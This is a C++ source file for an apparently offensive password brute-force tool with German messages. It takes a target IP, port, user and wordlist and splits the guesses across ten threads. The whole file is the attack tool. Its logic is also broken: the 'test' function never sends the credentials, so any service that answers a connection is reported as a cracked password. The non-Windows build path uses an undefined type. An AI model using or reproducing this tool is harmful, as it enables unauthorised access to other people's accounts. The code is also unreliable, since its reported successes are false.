#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <atomic>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#endif

std::mutex print_mutex;
std::atomic<bool> found(false);

bool test_tcp_connection(const std::string& target, int port, const std::string& user, const std::string& pass) {
#ifdef _WIN32
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return false;
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) { WSACleanup(); return false; }
    DWORD timeout = 3000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
#else
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return false;
    struct timeval timeout;
    timeout.tv_sec = 3;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char*)&timeout, sizeof(timeout));
#endif

    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    inet_pton(AF_INET, target.c_str(), &clientService.sin_addr);
    clientService.sin_port = htons(port);

    if (connect(sock, (SOCKADDR*)&clientService, sizeof(clientService)) < 0) {
#ifdef _WIN32
        closesocket(sock);
        WSACleanup();
#else
        close(sock);
#endif
        return false;
    }

#ifdef _WIN32
    char recvbuf[512];
    int bytesRecv = recv(sock, recvbuf, 512, 0);
    closesocket(sock);
    WSACleanup();
#else
    char recvbuf[512];
    int bytesRecv = read(sock, recvbuf, 512);
    close(sock);
#endif

    return bytesRecv > 0;
}

void worker(std::string target, int port, std::string user, std::vector<std::string> passwords, int start_idx, int end_idx) {
    for (int i = start_idx; i < end_idx; ++i) {
        if (found.load()) return;

        if (test_tcp_connection(target, port, user, passwords[i])) {
            std::lock_guard<std::mutex> lock(print_mutex);
            std::cout << "\n[+] Erfolg mit Passwort: " << passwords[i] << std::endl;
            found.store(true);
            return;
        } else {
            std::lock_guard<std::mutex> lock(print_mutex);
            std::cout << "[-] Getestet: " << passwords[i] << "                \r" << std::flush;
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 5) {
        std::cout << "Nutzung: force <Ziel-IP> <Port> <User> <Passwort-Datei>\n";
        return 1;
    }

    std::string target = argv[1];
    int port = std::stoi(argv[2]);
    std::string user = argv[3];
    std::string list_file = argv[4];

    std::ifstream file(list_file);
    if (!file.is_open()) {
        std::cout << "[-] Fehler: Konnte Passwort-Datei nicht öffnen!\n";
        return 1;
    }

    std::vector<std::string> passwords;
    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty()) passwords.push_back(line);
    }
    file.close();

    std::cout << "[*] C++ Tool gestartet gegen " << target << ":" << port << " (" << passwords.size() << " Passwörter)\n";

    int num_threads = 10;
    if (passwords.size() < num_threads) num_threads = passwords.size();
    int chunk_size = passwords.size() / num_threads;
    std::vector<std::thread> threads;

    for (int i = 0; i < num_threads; ++i) {
        int start = i * chunk_size;
        int end = (i == num_threads - 1) ? passwords.size() : (start + chunk_size);
        threads.emplace_back(worker, target, port, user, passwords, start, end);
    }

    for (auto& th : threads) {
        th.join();
    }

    std::cout << "\n[+] Fertig.\n";
    return 0;
}